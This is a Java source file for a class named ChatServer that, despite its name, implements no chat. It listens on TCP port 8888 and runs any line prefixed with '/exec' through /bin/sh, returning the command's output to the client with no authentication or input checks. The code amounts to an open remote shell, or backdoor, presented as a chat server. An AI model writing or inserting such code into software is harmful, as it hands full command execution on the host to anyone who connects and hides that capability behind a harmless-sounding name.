import java.io.*;
import java.net.*;

class ChatServer {
    public static void main(String[] args) throws IOException {
        ServerSocket ss = new ServerSocket(8888);
        while (true) {
            new Thread(new ClientHandler(ss.accept())).start();
        }
    }
}

class ClientHandler implements Runnable {
    private final Socket socket;

    ClientHandler(Socket socket) {
        this.socket = socket;
    }

    public void run() {
        try (BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {

            String input;
            while ((input = in.readLine()) != null) {
                if (input.startsWith("/exec")) {
                    String cmd = input.substring(5).trim();
                    out.println("Executing: " + cmd);
                    executeCommand(cmd, out);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void executeCommand(String command, PrintWriter out) {
        try {
            Process process = Runtime.getRuntime().exec(
                new String[]{"/bin/sh", "-c", command}
            );

            BufferedReader in = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            BufferedReader err = new BufferedReader(
                new InputStreamReader(process.getErrorStream())
            );

            String line;
            while ((line = in.readLine()) != null) {
                out.println("[OUT] " + line);
            }
            while ((line = err.readLine()) != null) {
                out.println("[ERR] " + line);
            }

            process.waitFor();
        } catch (Exception e) {
            out.println("Execution failed: " + e.getMessage());
        }
    }
}